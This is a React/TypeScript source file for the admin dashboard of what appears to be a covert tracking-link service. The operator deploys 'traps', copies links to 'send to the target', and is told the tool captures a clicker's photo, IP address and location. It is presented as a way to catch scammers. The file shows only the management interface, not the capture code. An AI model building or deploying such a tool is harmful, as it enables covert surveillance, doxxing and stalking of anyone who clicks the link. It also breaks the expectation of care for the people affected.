import { useState } from "react";
import { Link } from "wouter";
import { motion } from "framer-motion";
import { format } from "date-fns";
import { Copy, MapPin, Eye, Plus, Radar, Crosshair, ExternalLink, Loader2 } from "lucide-react";
import { AdminLayout } from "@/components/AdminLayout";
import { CreateLinkModal } from "@/components/CreateLinkModal";
import { useLinks } from "@/hooks/use-links";
import { useToast } from "@/hooks/use-toast";

export default function AdminDashboard() {
  const [isCreateModalOpen, setIsCreateModalOpen] = useState(false);
  const { data: links, isLoading, error } = useLinks();
  const { toast } = useToast();

  const handleCopyLink = (token: string, e: React.MouseEvent) => {
    e.preventDefault();
    const url = `${window.location.origin}/v/${token}`;
    navigator.clipboard.writeText(url);
    toast({
      title: "Link Copied!",
      description: "Send this URL to the target.",
    });
  };

  return (
    <AdminLayout>
      <div className="flex flex-col md:flex-row md:items-center justify-between gap-4 mb-8">
        <div>
          <h2 className="text-3xl font-display font-bold text-white mb-1">Active Traps</h2>
          <p className="text-muted-foreground">Manage your deployed links and view captured data.</p>
        </div>
        
        <button
          onClick={() => setIsCreateModalOpen(true)}
          className="px-6 py-3 rounded-xl font-semibold bg-white text-black shadow-lg shadow-white/10 hover:shadow-white/20 hover:-translate-y-0.5 active:translate-y-0 transition-all flex items-center gap-2"
        >
          <Plus className="w-5 h-5" />
          Deploy New Trap
        </button>
      </div>

      <CreateLinkModal 
        isOpen={isCreateModalOpen} 
        onClose={() => setIsCreateModalOpen(false)} 
      />

      {isLoading ? (
        <div className="flex flex-col items-center justify-center py-20 text-muted-foreground">
          <Loader2 className="w-10 h-10 animate-spin text-primary mb-4" />
          <p>Scanning database...</p>
        </div>
      ) : error ? (
        <div className="bg-destructive/10 border border-destructive/20 text-destructive p-6 rounded-2xl text-center">
          <p className="font-semibold">Failed to load links.</p>
          <p className="text-sm opacity-80 mt-1">Check your connection and try again.</p>
        </div>
      ) : links?.length === 0 ? (
        <div className="bg-card/50 border border-white/5 rounded-3xl p-12 text-center flex flex-col items-center">
          <div className="w-20 h-20 rounded-full bg-white/5 flex items-center justify-center mb-6">
            <Radar className="w-10 h-10 text-muted-foreground" />
          </div>
          <h3 className="text-2xl font-display font-bold text-white mb-2">No traps deployed</h3>
          <p className="text-muted-foreground max-w-md mb-8">
            Create your first tracking link, send it to a scammer, and wait for them to click. You'll capture their photo, IP, and location.
          </p>
          <button
            onClick={() => setIsCreateModalOpen(true)}
            className="px-6 py-3 rounded-xl font-semibold bg-gradient-to-r from-primary to-accent text-white shadow-lg shadow-primary/20 hover:shadow-primary/40 transition-all"
          >
            Create Your First Link
          </button>
        </div>
      ) : (
        <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6">
          {links?.map((link, index) => (
            <motion.div
              initial={{ opacity: 0, y: 20 }}
              animate={{ opacity: 1, y: 0 }}
              transition={{ delay: index * 0.05 }}
              key={link.id}
            >
              <Link href={`/link/${link.token}`}>
                <div className="glass-panel rounded-2xl p-6 hover:border-primary/50 hover:shadow-primary/10 transition-all group cursor-pointer h-full flex flex-col">
                  <div className="flex justify-between items-start mb-4">
                    <div className="w-12 h-12 rounded-full bg-primary/10 flex items-center justify-center group-hover:scale-110 group-hover:bg-primary/20 transition-all">
                      <Crosshair className="w-6 h-6 text-primary" />
                    </div>
                    <span className="text-xs font-mono text-muted-foreground bg-black/40 px-2.5 py-1 rounded-lg border border-white/5">
                      {format(new Date(link.createdAt), "MMM d, yyyy")}
                    </span>
                  </div>
                  
                  <h3 className="text-xl font-bold text-white mb-1 truncate" title={link.name}>
                    {link.name}
                  </h3>
                  <p className="text-sm font-mono text-primary/70 mb-6 truncate">
                    ID: {link.token.substring(0, 8)}...
                  </p>
                  
                  <div className="mt-auto flex items-center justify-between gap-3">
                    <button
                      onClick={(e) => handleCopyLink(link.token, e)}
                      className="flex-1 bg-white/5 hover:bg-white/10 text-white text-sm font-medium py-2.5 rounded-xl border border-white/5 transition-colors flex items-center justify-center gap-2"
                    >
                      <Copy className="w-4 h-4" />
                      Copy Link
                    </button>
                    <div className="w-10 h-10 rounded-xl bg-white/5 border border-white/5 flex items-center justify-center text-muted-foreground group-hover:text-white transition-colors">
                      <ExternalLink className="w-4 h-4" />
                    </div>
                  </div>
                </div>
              </Link>
            </motion.div>
          ))}
        </div>
      )}
    </AdminLayout>
  );
}
